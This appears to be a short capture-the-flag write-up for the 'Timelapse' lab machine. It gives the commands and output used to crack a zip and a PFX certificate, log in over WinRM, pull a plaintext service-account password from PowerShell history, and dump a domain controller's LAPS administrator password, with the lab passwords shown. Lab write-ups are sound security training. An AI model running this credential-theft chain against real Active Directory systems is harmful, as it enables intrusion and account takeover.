Timelapse

# Enumeration

# SMB zip crack
$ hashcat -a 0 -m 17200 ./hashcat_hashes.txt /opt/wordlists/crackstation.txt
supremelegacy

# SSL auth
user: legacy

$ john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt pfx_hashes.txt
thuglegacy

# User
$ evil-winrm -S -c cert.crt -k priv.key -i $URL

$ *Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> cat ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit

svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV

# Root
```bash
$ crackmapexec ldap $URL -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' --kdcHost $URL -M laps                                                 kali@kali
SMB         timelapse.htb   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
LDAP        timelapse.htb   389    DC01             [+] timelapse.htb\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV 
LAPS        timelapse.htb   389    DC01             [*] Getting LAPS Passwords
LAPS        timelapse.htb   389    DC01             Computer: DC01$                Password: p7o!!Y@B4/a2!vI&,p/+Bq57
```


